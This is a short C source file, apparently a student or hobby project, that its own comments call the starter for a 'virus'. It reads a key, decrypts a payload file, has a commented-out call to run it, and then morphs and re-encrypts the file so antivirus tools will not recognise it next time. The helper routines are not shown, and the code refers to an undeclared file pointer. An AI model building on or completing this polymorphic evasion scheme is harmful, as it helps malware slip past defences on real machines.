#include "start.h"

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* How to compile: make										 					 					*
* How to run: start                    									 	 				*
**********************************************************************************/

int main(int argc, char*argv[]) {
	FILE *keyFp;
	char ch;
	int key;
 	
	/* 
		Decrypt the file MtoX.c using the key in key.txt
	*/
	// Get the key from key.txt
	fp = fopen("key.txt","r");
	fscanf (fp, "%d", &key); 
	fclose(fp);

	// Decrypt the file needed to run the virus
	decryptFile(key);

	/* 
		Once the file is decrypted, start it running
	*/
	//system ("xichigan");

	// Wait for xichigan to finish

	/*
		Encrypt/Morph the file xichigan using the key so it looks different to the antivirus next time
	*/

	// Get a new key
	morphFile();
	encryptFile(key);	// TODO probably remove this

	return 0;
}


